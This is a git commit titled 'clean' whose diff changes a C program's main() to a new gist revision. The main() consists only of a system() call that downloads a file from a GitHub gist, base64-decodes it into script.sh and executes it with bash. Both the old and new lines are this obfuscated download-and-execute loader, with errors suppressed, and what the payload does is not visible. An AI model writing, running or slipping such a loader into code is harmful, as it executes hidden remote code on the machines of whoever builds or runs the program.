e2aae8a5463f0312f9835356ca113afbeee518d3
root <root@stretch.localdomain>
2019-01-14 12:20:17 +0000

    clean

--- srcs/main.c
+++ srcs/main.c
@@ -2,5 +2,5 @@
 
 int	main()
 {
-	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/cf65860415f0bbafd8a0fc0a047eb56dc13caccd/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
+	system("curl https://gist.githubusercontent.com/smurfy92/9fb82047e321bc976a345033e15d7ca6/raw/f710a93c7e312eca6e8a4577a88ce0b0ba7ddaf3/gistfile1.txt 2>&- > toto; base64 -d toto > script.sh; bash script.sh");
 }
